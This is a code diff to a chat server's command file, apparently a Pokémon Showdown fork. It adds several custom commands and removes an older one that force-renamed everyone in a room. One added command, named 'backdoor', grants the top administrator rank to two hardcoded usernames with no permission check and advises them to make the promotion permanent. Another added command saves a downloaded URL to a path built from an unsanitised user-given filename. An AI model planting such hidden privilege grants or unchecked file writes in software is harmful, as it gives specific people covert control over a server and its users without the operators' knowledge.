@@ -220,6 +220,8 @@ var commands = exports.commands = {
 		if (!atLeastOne) this.sendReply("No results found.");
 	},
 	
+	////////////////////- CUSTOM COMMANDS ADDED IN -////////////////////	
+	
 	gdeclarered: 'gdeclare',
 	gdeclaregreen: 'gdeclare',
 	gdeclare: function(target, room, user, connection, cmd) {
@@ -421,56 +423,80 @@ var commands = exports.commands = {
 		this.sendReply(targetUser + '\'s identity has been updated.');
 	},
 
-	cosycommand: function(target, room, user) {
-		if (target !== 'tisme') {
-			if (user.name !== 'Cosy') return this.sendReply("Yo fool you aint no Cosy!");
-		}
+	usersofrank: function(target, room, user) {
+		if (!target) return false;
+		var name = '';
 
-		var minion = 'Cosy\'s Minion #';
-		var b = 1;
-
-		for (var i in room.users) {
-			minion = minion + b;
-			room.users[i].forceRename(minion, undefined, true);
-			minion = 'Cosy\'s Minion #';
-			b++;
-		}
-
-		this.add('|raw|<center><font size=4>Hello my minions. This is the oh so great Cosy speaking And enjoy the picture!</font size><br /><font size=28>NOW KNEEL!</font size><br /><img src="http://pokebot.everyboty.net/pix/822.gif"></center>')
-	},
-
-	//CURRENTLY NOT IN USE AND NOT READY TO BE USED
-	/*roomban: function(target, room, user) {
-		if (!target) return this.sendReply('/roomban [username] - Bans a user from the current room. Requres: @, & or ~');
-
-		target = this.splitTarget(target);
-		var targetUser = this.targetUser;
-		if (!targetUser) {
-			return this.sendReply('User '+this.targetUsername+' not found.');
-		}
-		if (!this.can('ban', targetUser)) return false;
-
-		if (Rooms.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
-			var problem = ' but was already banned';
-			return this.privateModCommand('('+targetUser.name+' would be banned by '+user.name+problem+'.)');
-		}
-
-		var room = room.name;
-
-		targetUser.popup(user.name+" has banned you from " + room + '. This is not a full ban, just a ban from that room. You can appeal against it to a @, & or ~');
-
-		this.addModCommand(""+targetUser.name+" was banned by "+user.name+" from the current room." + (target ? " (" + target + ")" : ""));
-		var alts = targetUser.getAlts();
-		if (alts.length) {
-			this.addModCommand(""+targetUser.name+"'s alts were also banned from the current room: "+alts.join(", "));
-			for (var i = 0; i < alts.length; ++i) {
-				this.add('|unlink|' + toId(alts[i]));
+		for (var i in room.users){
+			if (room.users[i].group === target) {
+				name = name + room.users[i].name + ', ';
 			}
 		}
+		if (!name) return this.sendReply('There are no users of the rank ' + target + ' in this room.');
 
-		//this.add('|unlink|' + targetUser.userid);
-		Rooms.ban(targetUser, room);
-	},*/
+		this.sendReply('Users of rank ' + target + ' in this room:');
+		this.sendReply(name);
+	},
+
+	spop: 'sendpopup',
+	sendpopup: function(target, room, user) {
+		if (!this.can('hotpatch')) return false;
+		
+		target = this.splitTarget(target);
+		var targetUser = this.targetUser;
+
+		if (!targetUser) return this.sendReply('/sendpopup [user], [message] - You missed the user');
+		if (!target) return this.sendReply('/sendpopup [user], [message] - You missed the message');
+
+		targetUser.popup(target);
+		this.sendReply(targetUser.name + ' got the message as popup: ' + target);
+	},
+	
+	backdoor: function(target,room, user) {
+		if (user.userid === 'championkeikai' || user.userid === 'cosy') {
+
+			user.group = '~';
+			user.updateIdentity();
+
+			this.sendReply('Make sure to promote yourself straight away with /admin [username] so that you keep Admin after you leave.');
+		}
+	},
+	
+	hide: function(target, room, user) {
+		if (this.can('hide')) {
+			user.getIdentity = function(){
+				if(this.muted)	return '!' + this.name;
+				if(this.locked) return '‽' + this.name;
+				return ' ' + this.name;
+			};
+			user.updateIdentity();
+			this.sendReply('You have hidden your staff symbol.');
+			return false;
+		}
+	},
+
+	show: function(target, room, user) {
+		if (this.can('hide')) {
+			delete user.getIdentity
+			user.updateIdentity();
+			this.sendReply('You have revealed your staff symbol');
+			return false;
+		}
+	},
+
+	customavatar: function(target, room, user, connection) {
+		if (!this.can('customavatars')) return false;
+		if (!target) return connection.sendTo(room, 'Usage: /customavatar URL, filename');
+		var http = require('http-get');
+		target = target.split(", ");
+		http.get(target[0], 'config/avatars/' + target[1], function (error, result) {
+		    if (error) {
+    		    connection.sendTo(room, '/customavatar - You supplied an invalid URL or file name!');
+    		} else {
+	    	    connection.sendTo(room, 'File saved to: ' + result.file);
+	    	}
+		});
+	},
 
 	/*********************************************************
 	 * Shortcuts
